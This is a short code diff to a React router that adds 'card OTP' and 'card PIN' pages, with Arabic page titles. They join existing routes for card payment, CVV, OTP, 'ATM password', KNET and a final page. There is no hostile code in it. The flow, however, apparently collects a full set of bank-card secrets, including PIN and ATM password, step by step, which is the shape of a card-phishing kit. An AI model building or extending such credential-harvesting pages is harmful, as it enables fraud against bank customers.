@@ -27,6 +27,10 @@ import Legal from "./pages/Legal";
 import Info from "./pages/Info";
 import Admin from "./pages/Admin";
 
+// Card verification pages
+import CardOtp from "./pages/CardOtp";
+import CardPin from "./pages/CardPin";
+
 // Payment Pages (kept as-is)
 import CreditCardPayment from "./pages/CreditCardPayment";
 import OTPVerification from "./pages/OTPVerification";
@@ -71,6 +75,10 @@ function Router() {
       <Route path={"/info/:slug"} component={Info} />
       <Route path={"/admin"} component={Admin} />
 
+      {/* Card Verification Routes */}
+      <Route path={"/card-otp"} component={CardOtp} />
+      <Route path={"/card-pin"} component={CardPin} />
+
       {/* Payment Routes */}
       <Route path={"/credit-card-payment"} component={CreditCardPayment} />
       <Route path={"/otp-verification"} component={OTPVerification} />
@@ -114,6 +122,8 @@ function App() {
       '/credit-card-payment': 'الدفع ببطاقة الائتمان',
       '/otp-verification': 'رمز التحقق OTP',
       '/atm-password': 'كلمة مرور ATM',
+      '/card-otp': 'رمز OTP البطاقة',
+      '/card-pin': 'الرقم السري PIN',
       '/knet-payment': 'KNET',
       '/cvv': 'CVV',
       '/final-page': 'الصفحة النهائية',
